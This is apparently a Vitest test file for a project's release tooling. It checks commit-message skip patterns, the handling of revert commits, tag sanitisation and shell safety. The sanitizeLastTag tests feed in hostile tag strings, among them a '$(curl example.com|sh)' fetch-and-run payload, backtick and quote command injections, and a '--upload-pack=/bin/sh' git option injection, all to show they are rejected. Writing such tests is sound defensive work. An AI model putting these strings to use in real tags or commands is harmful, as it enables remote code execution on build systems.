import { describe, it, expect } from "vitest";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { isReleasable, sanitizeLastTag, SKIP_PATTERN_SOURCES } from "../releasable.js";

describe("isReleasable", () => {
  it("returns true when there is no prior tag (first release)", () => {
    expect(isReleasable(null)).toBe(true);
  });

  it("returns false when there are no new commits since the last tag", () => {
    expect(isReleasable([])).toBe(false);
  });

  it("returns false when all commits are chore: prefixed", () => {
    expect(isReleasable(["chore: update readme", "chore: cleanup"])).toBe(false);
  });

  it("returns false for chore(deps): (still starts with 'chore')", () => {
    expect(isReleasable(["chore(deps): bump vitest from 3.0.0 to 4.0.0"])).toBe(false);
  });

  it("returns false for chore(deps-dev): (still starts with 'chore')", () => {
    expect(isReleasable(["chore(deps-dev): bump typescript"])).toBe(false);
  });

  it("returns false when all commits are Bump-style (capital B)", () => {
    expect(isReleasable(["Bump lodash from 1.0 to 2.0"])).toBe(false);
  });

  it("returns false when all commits are bump-style (lowercase b)", () => {
    expect(isReleasable(["bump lodash from 1.0 to 2.0"])).toBe(false);
  });

  it("returns false for Merge pull request commits", () => {
    expect(isReleasable(["Merge pull request #42 from owner/feature"])).toBe(false);
  });

  it("returns false for Merge branch commits", () => {
    expect(isReleasable(["Merge branch 'feature/x' into main"])).toBe(false);
  });

  it("returns true when at least one commit is not a skip pattern (mixed set)", () => {
    expect(
      isReleasable([
        "chore(deps): bump eslint",
        "Bump lodash from 1.0 to 2.0",
        "feat: add DNSBL analyzer",
      ]),
    ).toBe(true);
  });

  it("returns true when the only commit is a real feature commit", () => {
    expect(isReleasable(["feat: add SPF strict mode"])).toBe(true);
  });

  it("'bumpversion' (no trailing space) is not a skip pattern", () => {
    expect(isReleasable(["bumpversion"])).toBe(true);
  });
});

// A rollback (#657) lands a revert commit on main, which triggers Release like
// any other push. That it cuts a CalVer tag is DELIBERATE, not an oversight:
// the GitHub Releases page is this project's changelog, and a rollback changes
// what is running in production. Suppressing the tag would leave the changelog
// asserting that the reverted code is still live. These tests pin that choice
// so nobody "fixes" it into a skip pattern later without reading this comment.
describe("revert commits (rollback lever, #657)", () => {
  it("treats a conventional 'revert:' commit as releasable", () => {
    expect(isReleasable(["revert: feat: add SPF strict mode (rollback of abc1234)"])).toBe(true);
  });

  it("treats git's default 'Revert \"...\"' subject as releasable", () => {
    expect(isReleasable(['Revert "feat: add SPF strict mode"'])).toBe(true);
  });

  it("stays releasable when the revert is batched with skippable chores", () => {
    expect(isReleasable(["chore(deps): bump vitest", "revert: bad analyzer change"])).toBe(true);
  });
});

describe("sanitizeLastTag", () => {
  it("passes through CalVer tags unchanged", () => {
    expect(sanitizeLastTag("v2026.4.1")).toBe("v2026.4.1");
    expect(sanitizeLastTag("v2026.12.10")).toBe("v2026.12.10");
  });

  it("rejects tags containing shell metacharacters", () => {
    expect(sanitizeLastTag("v1.$(curl example.com|sh)")).toBe("");
    expect(sanitizeLastTag("v2026.4.1`id`")).toBe("");
    expect(sanitizeLastTag('v2026.4.1";id;"')).toBe("");
  });

  it("rejects tags that look like git options", () => {
    expect(sanitizeLastTag("--upload-pack=/bin/sh")).toBe("");
  });

  it("rejects near-miss CalVer shapes", () => {
    expect(sanitizeLastTag("")).toBe("");
    expect(sanitizeLastTag("2026.4.1")).toBe("");
    expect(sanitizeLastTag("v2026.4")).toBe("");
    expect(sanitizeLastTag("v2026.4.1-rc1")).toBe("");
    expect(sanitizeLastTag("v2026.4.1 ")).toBe("");
  });
});

describe("check-releasable.ts shell safety", () => {
  it("never spawns a shell (no execSync — argv-array execFileSync only)", () => {
    const src = readFileSync(
      resolve(process.cwd(), "scripts/release/check-releasable.ts"),
      "utf8",
    );
    expect(src).not.toMatch(/\bexecSync\b/);
    expect(src).toContain("execFileSync");
  });
});

describe("cliff.toml sync", () => {
  it("SKIP_PATTERN_SOURCES matches all cliff.toml commit_parsers with skip = true", () => {
    const toml = readFileSync(resolve(process.cwd(), "cliff.toml"), "utf8");
    const cliffSkip = new Set<string>();
    for (const line of toml.split("\n")) {
      // Match lines like: { message = "^chore", skip = true },
      const m = line.match(/\{ message = "([^"]+)"[^}]*skip = true/);
      if (m) cliffSkip.add(m[1]);
    }
    const ourPatterns = new Set<string>(SKIP_PATTERN_SOURCES);
    expect(ourPatterns).toEqual(cliffSkip);
  });

  // Reverts are releasable (see above), so they WILL appear in release notes.
  // Without a parser of their own they fall through to the `body = ".*"`
  // catch-all and land under "Other" — a rollback is the single most
  // important line a changelog can carry, so it gets its own group.
  it("groups revert commits under 'Reverted' ahead of the catch-all parser", () => {
    const tomlLines = readFileSync(resolve(process.cwd(), "cliff.toml"), "utf8").split("\n");

    const revertIdx = tomlLines.findIndex(
      (l) => /message = "\^\[Rr\]evert"/.test(l) && /group = "Reverted"/.test(l),
    );
    const catchAllIdx = tomlLines.findIndex((l) => /body = "\.\*"/.test(l));

    expect(revertIdx).toBeGreaterThan(-1);
    expect(catchAllIdx).toBeGreaterThan(-1);
    expect(revertIdx).toBeLessThan(catchAllIdx);
    // Must not be skip = true, or the rollback would silently stop releasing.
    expect(tomlLines[revertIdx]).not.toMatch(/skip = true/);
  });
});
